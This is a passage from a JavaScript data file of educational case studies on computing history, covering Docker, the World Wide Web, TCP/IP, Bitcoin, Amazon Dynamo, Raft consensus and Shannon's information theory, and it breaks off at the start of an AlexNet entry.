  { t: "Brin & Page — The Anatomy of a Large-Scale Hypertextual Web Search Engine (1998)", u: "https://research.google/pubs/pub334/" }
 ]
},

{
 t: "Docker and Containerisation",
 s: "Namespaces, cgroups, and the end of 'works on my machine'",
 y: 2013, when: "2013 onwards",
 g: ["containers", "devops", "linux", "packaging"],
 tldr: "Linux had namespaces and cgroups for years — the kernel features that let processes run in isolated environments sharing the host kernel. Docker did not invent them. What Docker did was package them into a developer-friendly tool with a simple CLI, a layered image format, and a public registry for sharing images. 'Works on my machine' stopped being a joke because the machine shipped with the code. It changed how software is built, shipped and run, and it made Kubernetes necessary.",
 say: [
  "Docker did not invent containers — Linux namespaces and cgroups existed since 2006–2008. Docker made them usable.",
  "The Dockerfile is the real innovation: a declarative, repeatable recipe for building an environment, versioned with the code.",
  "The layered image format meant base images were shared and only differences were stored, which made images practical to distribute.",
  "It made microservices viable in practice — if each service ships its own container, dependency conflicts between services disappear."
 ],
 b: [
  { h: "What already existed" },
  { p: "Process isolation on Linux was not new in 2013:" },
  { l: [
   "**chroot (1979)** — changes the root directory for a process, providing basic filesystem isolation.",
   "**Namespaces (2002–2013)** — isolate process IDs, network stacks, mount points, user IDs and more. Each namespace gives a process a private view of the resource.",
   "**cgroups (2006)** — limit and account for CPU, memory, I/O and network resources per group of processes.",
   "**LXC (2008)** — combined namespaces and cgroups into a container runtime. Usable, but not simple."
  ] },
  { p: "The technology was there. The interface was not. Using LXC required understanding kernel internals. Building a repeatable environment meant writing shell scripts. Distributing environments meant tar files and tribal knowledge." },

  { h: "What Docker added" },
  { l: [
   "**Dockerfile.** A simple text file that declaratively describes how to build an image: start from a base, copy files, run commands, expose ports. Repeatable and versioned with the code.",
   "**Layered images.** Each instruction creates a filesystem layer. Layers are cached and shared, so a Python base image downloaded once serves all Python projects.",
   "**Docker Hub.** A public registry for sharing images. `docker pull nginx` gives you a running web server in seconds.",
   "**Simple CLI.** `docker build`, `docker run`, `docker push`. The abstraction was pitched at application developers, not system administrators."
  ] },
  { n: "The key insight was not technical but ergonomic. Containers were a kernel feature used by infrastructure teams. Docker repackaged them as a developer tool with a five-minute onboarding experience. That accessibility is what drove adoption — and it is a pattern that repeats: the technology that wins is often not the one that is most capable but the one that is most approachable.",
    nt: "The interface was the innovation" },

  { h: "What it changed" },
  { tl: [
    { t: "Mar 2013", d: "Docker is announced at PyCon. The demo takes five minutes." },
    { t: "2014", d: "Google, Microsoft and Amazon add Docker support. Adoption accelerates." },
    { t: "2015", d: "Docker Compose for multi-container apps. The OCI (Open Container Initiative) standardises image and runtime formats." },
    { t: "2014–2017", d: "Orchestration wars: Docker Swarm, Apache Mesos, Kubernetes. Kubernetes wins." },
    { t: "2018+", d: "Containers are the default deployment unit. Kubernetes becomes the standard orchestration layer." }
  ] },
  { l: [
   "**Dev-prod parity.** The container that runs in development is the same one that runs in production. Environment drift largely disappears.",
   "**Microservices became practical.** Dependency isolation per service means one team's Python 3.8 does not conflict with another team's Python 3.11.",
   "**CI/CD pipelines standardised.** Build a container, test it, push it to a registry, deploy it. The artifact is the same at every stage.",
   "**Kubernetes.** If every service is a container, you need a system to schedule, scale and network them. Kubernetes filled that role.",
   "**Serverless and FaaS** build on container primitives — functions run in lightweight containers with sub-second cold starts."
  ] }
 ],
 k: [
  "The kernel features existed for years; the developer experience is what created adoption.",
  "A Dockerfile is infrastructure as code at the packaging level — declarative, repeatable, versioned.",
  "Containers solve the dependency conflict problem by giving each service its own filesystem.",
  "Making containers easy to use created the need for orchestration, which is why Kubernetes exists."
 ],
 r: ["Container", "Docker", "Kubernetes", "Linux", "Microservices", "CI/CD", "DevOps"],
 src: [
  { t: "Solomon Hykes — The future of Linux Containers (PyCon 2013)", u: "https://www.youtube.com/watch?v=wW9CAH9nSLs" },
  { t: "Open Container Initiative — image and runtime specifications", u: "https://opencontainers.org/" }
 ]
},

{
 t: "The World Wide Web",
 s: "A proposal at CERN that connected humanity",
 y: 1989, when: "1989–1993",
 g: ["web", "http", "html", "client-server"],
 tldr: "Tim Berners-Lee, a physicist at CERN, proposed a system for sharing research documents using hypertext over the internet. He built three things: a naming scheme for resources (URLs), a transfer protocol (HTTP), and a markup language for documents (HTML). He also built the first web server and the first web browser. CERN released the technology royalty-free in 1993, and the web went from a document-sharing tool at a physics lab to the platform that reshaped civilisation.",
 say: [
  "Three inventions: URLs for naming, HTTP for transferring, HTML for structuring. That is the entire foundation.",
  "The decision to release it royalty-free was as important as the technology itself — if CERN had charged, the web would not have become universal.",
  "It was built on top of the internet (TCP/IP), not alongside it. The web is an application layer; the internet is the transport.",
  "Berners-Lee's original proposal was titled 'Information Management: A Proposal'. His boss wrote 'Vague, but exciting' on it."
 ],
 b: [
  { h: "The problem" },
  { p: "CERN had thousands of researchers using different computers, different operating systems, and different document formats. Information about projects, protocols and contacts was scattered across incompatible systems. Berners-Lee's proposal was for a networked hypertext system that could link documents across any machine." },
  { q: "This proposal provides for an information management system that links related information together in a useful way.", by: "Tim Berners-Lee, Information Management: A Proposal (March 1989)" },

  { h: "The three pillars" },
  { l: [
   "**URL (Uniform Resource Locator).** A universal naming scheme: `http://info.cern.ch/hypertext/WWW/TheProject.html`. Any resource anywhere on any server has an address anyone can type.",
   "**HTTP (HyperText Transfer Protocol).** A simple, stateless request-response protocol. A client sends `GET /page`, the server returns the document. No session, no connection memory, no complexity.",
   "**HTML (HyperText Markup Language).** A markup language where documents contain links to other documents. Click a link, fetch another page. The link is the web."
  ] },
  { p: "Berners-Lee also built the first web server (running on his NeXT workstation at CERN, with a note stuck to it reading 'This machine is a server. DO NOT POWER IT DOWN!!') and the first browser-editor, WorldWideWeb." },
  { n: "HTTP's statelessness is the design decision that matters most. Each request is independent — the server does not remember the client between requests. This was considered a limitation (and is why cookies had to be invented), but it is the reason the web scales: a stateless server can handle any request from any client with no coordination, which is why load balancing, caching and CDNs work.",
    nt: "Stateless by design" },

  { h: "The timeline" },
  { tl: [
    { t: "Mar 1989", d: "Berners-Lee writes the proposal. His boss, Mike Sendall, writes 'Vague, but exciting' on the cover." },
    { t: "Dec 1990", d: "The first web server and browser are running at CERN." },
    { t: "Aug 1991", d: "Berners-Lee posts to the alt.hypertext newsgroup announcing the World Wide Web." },
    { t: "1993", d: "CERN releases the web technology into the public domain, royalty-free." },
    { t: "1993", d: "Mosaic, the first graphical browser for non-expert users, is released by NCSA. It becomes Netscape." },
    { t: "1994", d: "Berners-Lee founds the W3C to steward web standards." }
  ] },

  { h: "Why it won" },
  { p: "The web was not the only hypertext system. HyperCard, Gopher, WAIS, and several academic hypertext systems existed. The web won because:" },
  { l: [
   "**It ran on the internet.** Not a separate network, not a proprietary protocol. It used TCP/IP, which was already everywhere.",
   "**It was free.** No licensing fees, no proprietary technology. Anyone could build a browser or a server.",
   "**It was simple.** HTML could be written in a text editor. HTTP could be debugged with telnet. The barrier to publishing was nearly zero.",
   "**Links were one-directional and could break.** This was considered a design flaw by hypertext purists. In practice, it meant you could link to any page without asking permission, which is why the web grew explosively."
  ] }
 ],
 k: [
  "Three simple standards — URLs, HTTP, HTML — are the entire foundation of the web.",
  "HTTP's statelessness is why the web scales: no per-client state on the server.",
  "Releasing the technology royalty-free was as important as inventing it.",
  "One-directional links that can break were a pragmatic choice that enabled permissionless linking and exponential growth."
 ],
 r: ["HTTP", "HTML", "DNS", "TCP/IP Model", "REST", "API", "Caching"],
 src: [
  { t: "Tim Berners-Lee — Information Management: A Proposal (1989)", u: "https://www.w3.org/History/1989/proposal.html" },
  { t: "CERN — The birth of the web", u: "https://home.cern/science/computing/birth-web" }
 ]
},

{
 t: "TCP/IP and the Internet",
 s: "The protocol suite that connected everything",
 y: 1983, when: "1969–1983",
 g: ["networking", "protocol", "packet switching", "arpanet"],
 tldr: "The internet exists because Vint Cerf and Bob Kahn designed a protocol suite — TCP/IP — that could connect fundamentally different networks without requiring them to change. The end-to-end principle put intelligence at the edges and made the network itself simple, which is why it scaled from four university nodes in 1969 to billions of devices. On 1 January 1983, ARPANET switched from NCP to TCP/IP, and the internet as we know it began.",
 say: [
  "The key idea was internetworking: connecting different networks (satellite, radio, Ethernet) through a common protocol without changing the underlying networks.",
  "The end-to-end principle puts complexity at the endpoints, not in the network. The network just moves packets — it does not understand them.",
  "TCP handles reliability (retransmission, ordering, flow control). IP handles addressing and routing. Separating them was a critical design decision.",
  "Flag Day — 1 January 1983 — is when ARPANET switched to TCP/IP. Every machine had to switch simultaneously. It is considered the birthday of the internet."
 ],
 b: [
  { h: "The problem" },
  { p: "By the early 1970s, ARPANET existed — a packet-switched network connecting research institutions. But it was one network with one protocol (NCP). Other networks were being built: satellite networks, radio networks, Ethernet LANs. They used different technologies, different speeds, different packet sizes." },
  { p: "The question was how to connect them. The telephone system's approach — a single global standard everyone must adopt — did not work because the networks were too different. Cerf and Kahn's insight was that you could connect networks without unifying them, by defining a common protocol that ran *between* networks." },

  { h: "The architecture" },
  { l: [
   "**IP (Internet Protocol).** Every machine gets an address. IP handles routing packets from source to destination across multiple networks. It is *unreliable by design* — packets can be dropped, duplicated, or arrive out of order. That simplicity is why routers are fast.",
   "**TCP (Transmission Control Protocol).** Runs on top of IP at the endpoints. Provides reliable, ordered, flow-controlled byte streams. Retransmits lost packets. Handles congestion. All the complexity lives here, at the edges.",
   "**The layered model.** Application → Transport (TCP/UDP) → Internet (IP) → Link (Ethernet, Wi-Fi, etc.). Each layer depends only on the one below it."
  ] },
  { n: "The end-to-end principle is the design philosophy: do not build reliability into the network if the endpoints need to verify it anyway. If TCP must check for errors regardless, having the network check too is redundant. This keeps the core network simple and fast, at the cost of complexity at the endpoints. Every subsequent internet protocol builds on this foundation.",
    nt: "The end-to-end principle" },

  { h: "The timeline" },
  { tl: [
    { t: "1969", d: "ARPANET connects its first four nodes: UCLA, SRI, UCSB, and Utah." },
    { t: "1974", d: "Cerf and Kahn publish 'A Protocol for Packet Network Intercommunication' describing TCP." },
    { t: "1978", d: "TCP is split into TCP and IP. UDP is added for connectionless datagrams." },
    { t: "1 Jan 1983", d: "Flag Day. ARPANET switches from NCP to TCP/IP. The internet begins." },
    { t: "1983", d: "DNS is introduced to replace the hosts.txt file that was manually maintained." },
    { t: "1990s", d: "The web, running on TCP/IP, drives explosive growth. The internet goes from academic to universal." }
  ] },

  { h: "Why it survived" },
  { p: "The OSI model, backed by ISO and international standards bodies, was supposed to replace TCP/IP with a more formally designed protocol suite. It failed. TCP/IP won because:" },
  { l: [
   "**It was running.** TCP/IP was deployed and working while OSI was being designed by committee.",
   "**It was free.** The specifications were published as RFCs (Requests for Comments), available to anyone. No licensing.",
   "**It was simple enough.** Four layers, not seven. The implementations were small enough for the hardware of the time.",
   "**BSD Unix included it.** Berkeley's TCP/IP implementation shipped with BSD Unix, which universities were already running. Adoption was immediate."
  ] },
  { p: "The protocols designed in the 1970s are the ones carrying your video call right now. The addressing scheme (IPv4) is running out, and IPv6 deployment has been a two-decade transition — but the architecture is unchanged." }
 ],
 k: [
  "Internetworking — connecting different networks without changing them — was the fundamental insight.",
  "The end-to-end principle: keep the network simple, put intelligence at the edges.",
  "Separating TCP (reliability) from IP (routing) allowed each to evolve independently.",
  "Running code beats elegant specification — TCP/IP won against the formally superior OSI model."
 ],
 r: ["TCP/IP Model", "DNS", "HTTP", "Bandwidth and Latency", "Load Balancer", "Packet", "Router", "Socket"],
 src: [
  { t: "Cerf & Kahn — A Protocol for Packet Network Intercommunication, IEEE (1974)", u: "https://ieeexplore.ieee.org/document/1092259" },
  { t: "RFC 791 — Internet Protocol (1981)", u: "https://www.rfc-editor.org/rfc/rfc791" }
 ]
},

{
 t: "Bitcoin and the Blockchain",
 s: "Solving double-spending without a bank",
 y: 2008, when: "2008–2009",
 g: ["distributed consensus", "cryptography", "peer-to-peer", "economics"],
 tldr: "An anonymous author using the name Satoshi Nakamoto published a paper describing a peer-to-peer electronic cash system that could operate without a trusted third party. The key innovation was the blockchain: a distributed ledger where transactions are grouped into blocks linked by cryptographic hashes, and the right to append a block is earned by expending computational work (proof of work). It solved the double-spending problem without a bank, and the data structure and consensus mechanism became a field of their own.",
 say: [
  "The problem it solved: how do you prevent someone from spending the same digital money twice without a central authority to check?",
  "The blockchain is a linked list of blocks, where each block contains a hash of the previous block — changing any historical block invalidates every subsequent one.",
  "Proof of work is a lottery: miners compete to find a nonce that makes their block's hash fall below a target, burning electricity as the cost of participation.",
  "The technical ideas — hash chains, Merkle trees, proof of work — all existed before. Nakamoto's contribution was combining them into a working system."
 ],
 b: [
  { h: "The double-spending problem" },
  { p: "Physical cash solves double-spending trivially: when you hand someone a coin, you do not have it anymore. Digital data can be copied perfectly, so digital money can be spent twice unless something prevents it. Traditional systems use a trusted third party — a bank — to maintain the canonical ledger and reject duplicate transactions." },
  { p: "Nakamoto's paper asked: can you build a payment system where no single party controls the ledger, and participants who do not trust each other can still agree on which transactions are valid?" },

  { h: "How it works" },
  { l: [
   "**Transactions** are broadcast to the network. Each transaction references the outputs of previous transactions and is signed with the sender's private key.",
   "**Blocks** are collections of transactions. Each block header contains a hash of the previous block header, creating a chain. Altering any block changes its hash, which invalidates every block after it.",
   "**Merkle trees.** Transactions within a block are hashed into a binary tree. The root hash is included in the block header, allowing efficient verification that any transaction is in the block without downloading all of them.",
   "**Proof of work.** To append a block, a miner must find a value (nonce) such that the block header's SHA-256 hash falls below a difficulty target. This requires brute-force computation — roughly 10 minutes of the entire network's combined hash power.",
   "**Longest chain rule.** If two miners produce valid blocks simultaneously, the network eventually converges on the chain with more cumulative work. Transactions become effectively irreversible after several blocks."
  ] },
  { x: { lang: "text", code:
"Block 0 (Genesis)    Block 1              Block 2\n┌──────────────┐     ┌──────────────┐     ┌──────────────┐\n│ Hash: 000abc │◄────│ Prev: 000abc │◄────│ Prev: 000def │\n│ Nonce: 42    │     │ Hash: 000def │     │ Hash: 000ghi │\n│ Merkle Root  │     │ Nonce: 1337  │     │ Nonce: 7890  │\n│ Tx1, Tx2     │     │ Merkle Root  │     │ Merkle Root  │\n└──────────────┘     │ Tx3, Tx4, Tx5│     │ Tx6, Tx7     │\n                     └──────────────┘     └──────────────┘\n\nChanging Tx3 → changes Merkle Root → changes Block 1 Hash\n→ invalidates Block 2's Prev pointer → chain breaks" } },
  { n: "The energy cost of proof of work is not a bug — it is the mechanism. Rewriting history requires re-doing all the work for the altered block and every block after it, faster than the rest of the network extends the honest chain. The cost of attack scales with the network's total hash rate, which is why 51% attacks are discussed as the fundamental threat model.",
    nt: "Energy is the security model" },

  { h: "The CS concepts involved" },
  { l: [
   "**Cryptographic hash functions (SHA-256).** One-way, collision-resistant, deterministic. The foundation of both the chain structure and the mining process.",
   "**Merkle trees.** Binary hash trees enabling O(log n) membership proofs — a data structure from 1979 that found its most visible application here.",
   "**Public-key cryptography.** Transaction signing and address generation use elliptic curve cryptography (secp256k1).",
   "**Distributed consensus.** Nakamoto consensus is a probabilistic solution to Byzantine fault tolerance — nodes agree on state without trusting each other, at the cost of finality being probabilistic rather than instant.",
   "**Peer-to-peer networking.** No central server. Nodes discover each other, broadcast transactions and blocks, and independently validate everything."
  ] },

  { h: "What it became" },
  { p: "Bitcoin launched in January 2009. The blockchain concept spawned Ethereum (adding programmable smart contracts), DeFi, NFTs, and thousands of other projects — alongside substantial fraud, speculation and environmental criticism. The underlying data structure and consensus mechanism are now studied as serious distributed systems contributions regardless of one's view on cryptocurrency." }
 ],
 k: [
  "A hash chain makes history tamper-evident: changing any block invalidates all subsequent ones.",
  "Proof of work converts electricity into trustless consensus — the energy cost is the security guarantee.",
  "Merkle trees provide efficient membership proofs in O(log n) — used far beyond blockchains.",
  "Nakamoto consensus is probabilistic Byzantine fault tolerance for open networks where participants are anonymous."
 ],
 r: ["Hashing", "Public-Key Cryptography", "Distributed System", "Consensus", "Encryption"],
 src: [
  { t: "Nakamoto — Bitcoin: A Peer-to-Peer Electronic Cash System (2008)", u: "https://bitcoin.org/bitcoin.pdf" },
  { t: "Bitcoin Developer Documentation", u: "https://developer.bitcoin.org/devguide/" }
 ]
},

{
 t: "Amazon Dynamo",
 s: "The paper that ignited the NoSQL era",
 y: 2007, when: "October 2007",
 g: ["nosql", "distributed systems", "eventual consistency", "consistent hashing", "amazon", "high availability"],
 tldr: "Amazon discovered that 70% of their retail database queries were simple single-key lookups, yet relational databases were collapsing under Black Friday peak traffic due to strict ACID constraints. Giuseppe DeCandia and Werner Vogels published Dynamo — a decentralized, highly available key-value storage system that traded ACID consistency for guaranteed write availability. Its techniques — consistent hashing, vector clocks, sloppy quorums (W + R > N), and hinted handoff — directly birthed Cassandra, Riak, DynamoDB, and the entire NoSQL industry.",
 say: [
  "Dynamo established that for high-scale e-commerce, availability and bounded latency trump strict ACID consistency.",
  "Consistent hashing with virtual nodes ensures load is evenly distributed across a ring without repartitioning the entire cluster.",
  "Sloppy quorums and hinted handoff ensure writes succeed even if the primary replica nodes are temporarily unreachable.",
  "It gave birth to the NoSQL movement — Cassandra, Riak, DynamoDB, and Couchbase are direct descendants."
 ],
 b: [
  { h: "The shopping cart problem" },
  { p: "In the mid-2000s, Amazon's e-commerce platform ran on massive Oracle relational database clusters. During holiday peak traffic (like Black Friday and Cyber Monday), database locks, multi-table joins, and synchronous replication brought the checkout flow to a crawl." },
  { p: "Amazon leadership established a core business rule: **a customer must never be prevented from adding an item to their shopping cart.** If a network partition occurred, a database write must succeed anyway, even if different data replicas temporarily disagreed on the contents of the cart." },

  { h: "The core architecture: A ring of nodes" },
  { p: "Dynamo is a decentralized, masterless peer-to-peer storage system where all nodes are symmetrical. It synthesized five fundamental distributed systems techniques:" },
  { l: [
   "**Consistent Hashing with Virtual Nodes.** Keys and server nodes are hashed onto a 128-bit circular ring. A key is stored on the first $N$ unique physical nodes clockwise from its hash position. Virtual nodes (tokens) ensure even data distribution across machines with varying hardware capabilities.",
   "**Sloppy Quorums ($W + R > N$).** If $N=3$ replicas are configured, a write succeeds as soon as $W=2$ nodes acknowledge, and a read succeeds when $R=2$ respond. Since $W + R > N$, read and write sets overlap, guaranteeing the latest update is seen under normal operation.",
   "**Hinted Handoff.** If a target replica node is down during a write, the write is sent to a healthy substitute node with a 'hint' metadata tag. Once the original node recovers, the substitute delivers the missed update.",
   "**Vector Clocks.** When network partitions allow concurrent conflicting updates to the same key, vector clocks capture the causal ordering of events. If branches cannot be merged automatically, Dynamo hands the conflicting versions back to the client application to reconcile (e.g. merging shopping carts by taking the union of items).",
   "**Anti-entropy with Merkle Trees.** Background gossip protocols compare hierarchical Merkle hash trees between replicas to rapidly detect and synchronize out-of-date key ranges without transferring the entire dataset across the network."
  ] },
  { x: { lang: "text", code:
"                         Consistent Hashing Ring\n\n                             Node A (Tokens: 0, 100)\n                                  ▲\n                             ┌────┴────┐\n                        ┌────┘         └────┐\n                        │                   │\n       Node D (Tokens)  │     Key 'user_42' │   Node B (Tokens: 50, 150)\n             ◄──────────┤      (Hash: 120)  ├──────────►\n                        │   Stored on:      │\n                        │   Nodes B, C, D   │\n                        └────┐         ┌────┘\n                             └────┬────┘\n                                  ▼\n                             Node C (Tokens: 80, 180)\n\n  Key is mapped to the ring and replicated clockwise to the next N physical nodes" } },

  { h: "Trade-offs and the birth of NoSQL" },
  { p: "Dynamo explicitly chose **Availability and Partition Tolerance (AP)** in the CAP theorem, sacrificing immediate Consistency in exchange for SLA guarantees where 99.9% of requests completed under 300ms." },
  { p: "In 2007, Amazon published the paper at SOSP. Because Amazon did not open-source the code, the open-source community implemented the paper directly:" },
  { l: [
   "**Apache Cassandra (Facebook, 2008):** Combined Dynamo's partitioned ring with Google Bigtable's log-structured merge-tree (LSM) storage engine.",
   "**Basho Riak (2009):** A pure Erlang implementation of the Dynamo paper.",
   "**Amazon DynamoDB (2012):** Amazon's fully managed cloud service that incorporated Dynamo's partitioning with Paxos-based strong consistency options."
  ] }
 ],
 k: [
  "Dynamo prioritized write availability and 99.9th percentile latency over strict ACID consistency.",
  "Consistent hashing distributes keys across a ring, minimizing data movement when nodes join or fail.",
  "Sloppy quorums (W + R > N) and hinted handoff ensure high availability during network partitions.",
  "The 2007 Dynamo paper triggered the NoSQL explosion, directly inspiring Cassandra, Riak, and DynamoDB."
 ],
 r: ["Distributed System", "Eventual Consistency", "NoSQL", "Replication", "CAP Theorem", "High Availability"],
 src: [
  { t: "DeCandia et al. — Dynamo: Amazon's Highly Available Key-value Store (SOSP 2007)", u: "https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf" },
  { t: "Werner Vogels — Eventually Consistent (CACM 2009)", u: "https://cacm.acm.org/magazines/2009/1/15666-eventually-consistent/fulltext" }
 ]
},

{
 t: "Raft Consensus",
 s: "Making distributed agreement understandable",
 y: 2014, when: "June 2014",
 g: ["consensus", "distributed systems", "raft", "fault tolerance", "replicated state machine", "kubernetes"],
 tldr: "For two decades, Leslie Lamport's Paxos was the unchallenged theoretical foundation of distributed consensus, yet almost nobody in the industry could understand or implement it correctly. Diego Ongaro and John Ousterhout introduced Raft with 'understandability' as a primary engineering design goal. By decomposing consensus into three independent subproblems — Leader Election, Log Replication, and Safety — Raft became the consensus engine behind Kubernetes (via etcd), CockroachDB, TiKV, HashiCorp Consul, and modern cloud infrastructure.",
 say: [
  "Paxos was so obscure that real-world implementations constantly failed; Raft was explicitly designed to be easy for humans to understand.",
  "Raft breaks consensus into three clear phases: Leader Election, Log Replication, and Safety invariants.",
  "A leader cannot be elected unless its log contains all committed entries from previous terms (the Leader Completeness property).",
  "Raft powers the backbone of modern cloud computing through etcd in every Kubernetes cluster worldwide."
 ],
 b: [
  { h: "The Paxos comprehension crisis" },
  { p: "In 1998, Leslie Lamport published *The Part-Time Parliament*, introducing the **Paxos** algorithm for consensus in asynchronous distributed systems with unannounced failures. Paxos was mathematically profound, but notoriously unintelligible." },
  { p: "In 2007, Google engineers published *Paxos Made Live*, describing their multi-year ordeal implementing Paxos for Chubby: *'There are significant gaps between the description of the Paxos algorithm and the needs of a real-world system... the final system will be based on an unproven protocol.'* If Google's top engineers struggled to implement Paxos correctly, the broader software industry had little hope." },

  { h: "Design for understandability" },
  { p: "Diego Ongaro and John Ousterhout at Stanford set out to create a consensus algorithm whose primary design objective was human understandability. They conducted user studies with 43 computer science students to measure how quickly engineers could learn, explain, and correctly modify the protocol." },
  { p: "Raft decomposes consensus into three decoupled subproblems:" },
  { l: [
   "**1. Leader Election.** At any given time, every node is in one of three states: *Leader*, *Follower*, or *Candidate*. Time is divided into arbitrary numbered *Terms*. If a follower hears no heartbeat from the leader before a randomized election timeout (150ms–300ms), it transitions to Candidate and requests votes from peers. A candidate receiving votes from a majority of nodes becomes the new Leader.",
   "**2. Log Replication.** Clients send write commands exclusively to the Leader. The leader appends the command to its local log and broadcasts `AppendEntries` RPCs to followers. Once a majority of followers acknowledge the entry, the leader commits it and applies it to its local state machine.",
   "**3. Safety & Log Matching.** A candidate's vote request is rejected if its log is less up-to-date than the voter's log. This **Leader Completeness** guarantee ensures that any newly elected leader already holds all committed entries from all previous terms — meaning log entries only flow in one direction: from Leader to Followers."
  ] },
  { x: { lang: "text", code:
"                 Raft Replicated State Machine Architecture\n\n       Client Write Request ──► [ Leader (Term 2) ]\n                                        │\n                       AppendEntries RPC│ (Broadcast to Quorum)\n                                        ▼\n          ┌─────────────────────────────┴─────────────────────────────┐\n          ▼                                                           ▼\n┌───────────────────┐                                       ┌───────────────────┐\n│ Follower 1 (Term 2│                                       │ Follower 2 (Term 2│\n│ Log: [1:SET x=5]  │                                       │ Log: [1:SET x=5]  │\n│      [2:SET y=10] │                                       │      [2:SET y=10] │\n└─────────┬─────────┘                                       └─────────┬─────────┘\n          │ Majority Quorum Confirms (2 of 3)                         │\n          └─────────────────────────────┬─────────────────────────────┘\n                                        ▼\n                         Entry Committed & Applied to\n                         Replicated State Machine (KV Store)" } },

  { h: "Randomized timers solve split votes" },
  { p: "In symmetric distributed systems, split votes occur when two nodes simultaneously declare candidacy, splitting the vote 50/50 and causing repeated deadlocks. Raft solves this with **randomized election timeouts** (e.g. node A waits 170ms, node B waits 240ms)." },
  { p: "One node's timer inevitably expires first, allowing it to collect votes and broadcast heartbeats before other candidates trigger an election." },

  { h: "Modern infrastructure backbone" },
  { p: "Raft's clean specification allowed engineers across the world to build bulletproof, production-grade distributed consensus engines in months rather than years:" },
  { l: [
   "**etcd:** The distributed key-value store powering Kubernetes state, service discovery, and cluster configuration worldwide.",
   "**HashiCorp Consul & Nomad:** Raft-based service mesh and workload orchestration.",
   "**Distributed SQL:** CockroachDB, TiDB/TiKV, and YugabyteDB use Multi-Raft (running thousands of isolated Raft groups per database partition) for horizontal scaling with strong ACID guarantees."
  ] }
 ],
 k: [
  "Raft replaced inscrutable Paxos by decomposing consensus into Leader Election, Log Replication, and Safety.",
  "Randomized election timeouts cleanly resolve split-vote deadlocks during leader elections.",
  "The Leader Completeness property guarantees that entries only flow one-way from the leader to followers.",
  "Raft powers the consensus core of modern cloud infrastructure via etcd, Kubernetes, and Distributed SQL."
 ],
 r: ["Distributed System", "Consensus", "State Machine", "Leader Election", "Replication", "CAP Theorem"],
 src: [
  { t: "Ongaro & Ousterhout — In Search of an Understandable Consensus Algorithm (USENIX ATC 2014)", u: "https://raft.github.io/raft.pdf" },
  { t: "Raft Consensus Algorithm Interactive Visualization & Specification", u: "https://raft.github.io/" }
 ]
}

]);



/* data/studies/04-breakthroughs.js */
/* Case studies — Papers & Breakthroughs. */
TD.addStudies("breakthroughs", [

{
 t: "Shannon's Information Theory",
 s: "The paper that invented the bit",
 y: 1948, when: "1948",
 g: ["information theory", "entropy", "compression", "bell labs"],
 tldr: "Claude Shannon published a paper that separated information from meaning, gave it a unit — the bit — and proved that every communication channel has a maximum rate above which error-free transmission is impossible and below which it is always achievable. Compression, error correction, cryptography and the cross-entropy loss in your neural network all descend from it.",
 say: [
  "Shannon separated information from meaning: how surprising a message is, not what it says.",
  "It is where the word *bit* comes from, and where entropy as a measure of uncertainty comes from.",
  "The channel coding theorem says there is a hard limit to error-free throughput over a noisy channel — and that you can always get arbitrarily close to it.",
  "The same entropy shows up as cross-entropy loss in ML, which is not a coincidence — it is literally the same quantity."
 ],
 b: [
  { h: "The move" },
  { p: "Before 1948, *information* was not a quantity you could measure. Shannon, working at Bell Labs on the practical problem of transmitting signals reliably, made a decision that looked like a limitation and turned out to be the key: he threw away meaning entirely." },
  { q: "The fundamental problem of communication is that of reproducing at one point either exactly or approximately a message selected at another point. Frequently the messages have meaning… These semantic aspects of communication are irrelevant to the engineering problem.", by: "Claude Shannon, A Mathematical Theory of Communication (1948)" },
  { p: "What remains once you discard meaning is **surprise**. A message that was certain in advance carries no information. A message that was one of a million equally likely possibilities carries a great deal. Information is the reduction of uncertainty, and uncertainty can be measured." },

  { h: "Entropy" },
  { p: "Shannon defined the entropy of a source as the average surprise of its output, measured in bits — the term suggested to him by his colleague John Tukey, short for *binary digit*." },
  { l: [
   "A fair coin has one bit of entropy per flip: two equally likely outcomes, and you need exactly one yes/no question to determine which.",
   "A two-headed coin has zero entropy. You already know the answer, so the flip tells you nothing.",
   "A biased coin, 90% heads, has about 0.47 bits per flip. Less surprising, so less information — and therefore compressible."
  ] },
  { p: "That last point is the **source coding theorem**: entropy is the hard floor on lossless compression. You cannot compress a source below its entropy, and you can always get arbitrarily close. This is why your ZIP file stops shrinking, and why compressing an already-compressed file achieves nothing — the redundancy is gone." },
  { n: "The cross-entropy loss used to train essentially every classifier is Shannon's quantity applied to a model's predictions: how surprised is the model by the true label? A confident correct prediction has low surprise; a confident wrong one has enormous surprise, which is why the log of a near-zero probability blows up. KL divergence, used in variational inference and distillation, measures the extra bits wasted by believing the wrong distribution.",
    nt: "Why this is in your loss function" },

  { h: "The channel coding theorem" },
  { p: "The second major result is more surprising. Every noisy channel has a **capacity** — a maximum rate in bits per second. The theorem states that below capacity, arbitrarily reliable communication is possible: you can drive the error rate as close to zero as you like. Above capacity, you cannot." },
  { p: "The counterintuitive part is that error-free communication over a noisy channel is achievable at all. The intuition beforehand was that you fought noise by shouting louder or repeating yourself, trading throughput for reliability with no clean stopping point. Shannon proved that clever enough coding beats repetition, and told you exactly how far you could push it." },
  { p: "He did not, however, say how to build such a code. That took another fifty years — turbo codes in 1993 and the rediscovery of LDPC codes finally approached the Shannon limit in practice, and they are now in Wi-Fi, 5G and satellite links." },

  { h: "What it underpins now" },
  { l: [
   "**Compression** — ZIP, JPEG, MP3, video codecs. All of them are exploiting the gap between raw size and actual entropy.",
   "**Error correction** — the reason a scratched disc still plays, a QR code works when partly obscured, and RAID survives a failed drive.",
   "**Cryptography** — Shannon's later work formalised perfect secrecy and showed the one-time pad achieves it, at the cost of a key as long as the message.",
   "**Machine learning** — cross-entropy loss, KL divergence, information gain in decision trees, mutual information in feature selection.",
   "**Everything else** — modems, mobile networks, deep space communication with Voyager, and the fact that you can quantify a channel at all."
  ] }
 ],
 k: [
  "Information is surprise, measured in bits — meaning is deliberately excluded.",
  "Entropy is the hard floor on lossless compression, which is why compressed files stop shrinking.",
  "Every noisy channel has a capacity: below it, near-perfect transmission is achievable; above it, impossible.",
  "The cross-entropy in your loss function is the same quantity, applied to a model's predictions."
 ],
 r: ["Entropy", "KL Divergence", "Information Gain", "Cross-Entropy", "Probability", "Bandwidth and Latency", "Hashing", "Encryption"],
 src: [
  { t: "Shannon — A Mathematical Theory of Communication, Bell System Technical Journal (1948)", u: "https://people.math.harvard.edu/~ctm/home/text/others/shannon/entropy/entropy.pdf" }
 ]
},

{
 t: "AlexNet",
 s: "The afternoon deep learning stopped being a backwater",
 y: 2012, when: "September 2012",
 g: ["deep learning", "imagenet", "gpu", "convolutional"],
